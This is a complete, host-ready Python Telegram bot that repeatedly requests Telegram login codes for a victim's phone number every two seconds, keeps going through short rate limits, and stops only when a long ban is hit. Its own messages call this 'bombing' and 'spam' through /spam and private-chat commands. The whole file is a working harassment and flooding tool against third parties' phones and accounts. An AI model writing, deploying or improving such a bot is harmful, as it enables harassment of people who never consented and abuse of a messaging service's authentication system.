# language: Python, file: otp_bot.py, runtime: Python 3.10+
# Host-ready: reads BOT_TOKEN / API_ID / API_HASH from environment or .env

import asyncio
import logging
import os
import re
from collections import defaultdict

from dotenv import load_dotenv
from telegram import Update
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    ContextTypes,
    filters,
)
from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.errors import FloodWaitError, PhoneNumberInvalidError, PhoneNumberBannedError

load_dotenv()

# ─── CONFIG ───────────────────────────────────────────────────────────────────
BOT_TOKEN = os.getenv("BOT_TOKEN")
API_ID    = int(os.getenv("API_ID", "0"))
API_HASH  = os.getenv("API_HASH")

if not BOT_TOKEN or not API_ID or not API_HASH:
    raise SystemExit("Missing BOT_TOKEN / API_ID / API_HASH in environment or .env")

MIN_LIMIT_HOURS = 9
SEND_INTERVAL   = 2

# ─── STATE ────────────────────────────────────────────────────────────────────
active_jobs: dict[int, dict[str, asyncio.Task]] = defaultdict(dict)
PHONE_RE = re.compile(r"^\+\d{8,15}$")

logging.basicConfig(
    format="%(asctime)s - %(levelname)s - %(message)s",
    level=logging.INFO,
)
log = logging.getLogger("otp_bot")


# ─── WORKER ───────────────────────────────────────────────────────────────────
async def otp_worker(user_id: int, phone: str, chat_id: int, bot):
    while True:
        client = TelegramClient(StringSession(), API_ID, API_HASH)
        try:
            await client.connect()
            await client.send_code_request(phone)
            log.info("OTP sent → %s (user %s)", phone, user_id)
        except FloodWaitError as e:
            wait = e.seconds
            hours = wait / 3600
            if hours >= MIN_LIMIT_HOURS:
                msg = (
                    f"🚫 OTP Sending Stopped!\n"
                    f"Number: {phone}\n"
                    f"Error: Telegram Rate Limit hit: You must wait ~{hours:.1f} hours "
                    f"before trying this number again.\n"
                    f"Stopping the process."
                )
                await bot.send_message(chat_id, msg)
                break
            else:
                log.info("Short FloodWait %ss on %s — sleeping then resume", wait, phone)
                await asyncio.sleep(wait)
                continue
        except (PhoneNumberInvalidError, PhoneNumberBannedError) as e:
            await bot.send_message(chat_id, f"❌ {phone} rejected by Telegram: {e}")
            break
        except asyncio.CancelledError:
            raise
        except Exception as ex:
            log.warning("Transient error on %s: %s", phone, ex)
            await asyncio.sleep(5)
            continue
        finally:
            try:
                await client.disconnect()
            except Exception:
                pass

        await asyncio.sleep(SEND_INTERVAL)

    if phone in active_jobs.get(user_id, {}):
        del active_jobs[user_id][phone]
        if not active_jobs[user_id]:
            del active_jobs[user_id]


# ─── HELPERS ──────────────────────────────────────────────────────────────────
def is_valid_phone(text: str) -> bool:
    return bool(PHONE_RE.match(text.strip()))


async def start_job(user_id: int, phone: str, chat_id: int, bot) -> str:
    phone = phone.strip()
    if not is_valid_phone(phone):
        return "❌ Invalid phone number format. Please include the country code (e.g., +919876543210)."

    if phone in active_jobs.get(user_id, {}):
        return f"⚠️ You are already bombing {phone}! To stop it, use /stop {phone}."

    task = asyncio.create_task(otp_worker(user_id, phone, chat_id, bot))
    active_jobs[user_id][phone] = task

    return (
        f"🚀 Started sending OTPs to {phone}!\n"
        f"I will keep sending every {SEND_INTERVAL} seconds until a limit is reached "
        f"or you use /stop."
    )


async def stop_jobs(user_id: int, phone: str | None = None) -> str:
    jobs = active_jobs.get(user_id, {})
    if not jobs:
        return "⚠️ No active processes found for you."

    if phone:
        phone = phone.strip()
        task = jobs.pop(phone, None)
        if task is None:
            return f"⚠️ No active process found for {phone}."
        task.cancel()
        try:
            await task
        except asyncio.CancelledError:
            pass
        if not jobs:
            del active_jobs[user_id]
        return "🛑 Stopped 1 active OTP processes."

    count = len(jobs)
    for t in list(jobs.values()):
        t.cancel()
    for t in list(jobs.values()):
        try:
            await t
        except asyncio.CancelledError:
            pass
    del active_jobs[user_id]
    return f"🛑 Stopped {count} active OTP processes."


# ─── HANDLERS ─────────────────────────────────────────────────────────────────
async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = (
        "👋 Welcome to the OTP Bot, Not In use!\n"
        "This bot can send OTPs to a phone number every 2 seconds until it's limited.\n"
        "📌 How to use (Private Chat): Just send the phone number (with country code).\n"
        "📌 How to use (Group Chat): Use /spam +919876543210 to start bombing.\n"
        "/stop = It stops sending codes to all numbers."
    )
    await update.message.reply_text(text)


async def cmd_spam(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text("Usage: /spam +919876543210")
        return
    phone = context.args[0]
    reply = await start_job(
        update.effective_user.id,
        phone,
        update.effective_chat.id,
        context.bot,
    )
    await update.message.reply_text(reply)


async def cmd_stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    phone = context.args[0] if context.args else None
    reply = await stop_jobs(update.effective_user.id, phone)
    await update.message.reply_text(reply)


async def private_number(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_chat.type != "private":
        return
    text = update.message.text.strip()
    if not text.startswith("+"):
        return
    reply = await start_job(
        update.effective_user.id,
        text,
        update.effective_chat.id,
        context.bot,
    )
    await update.message.reply_text(reply)


# ─── MAIN ─────────────────────────────────────────────────────────────────────
def main():
    app = Application.builder().token(BOT_TOKEN).build()

    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(CommandHandler("spam", cmd_spam))
    app.add_handler(CommandHandler("stop", cmd_stop))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, private_number))

    log.info("Bot starting…")
    app.run_polling(allowed_updates=Update.ALL_TYPES)


if __name__ == "__main__":
    main()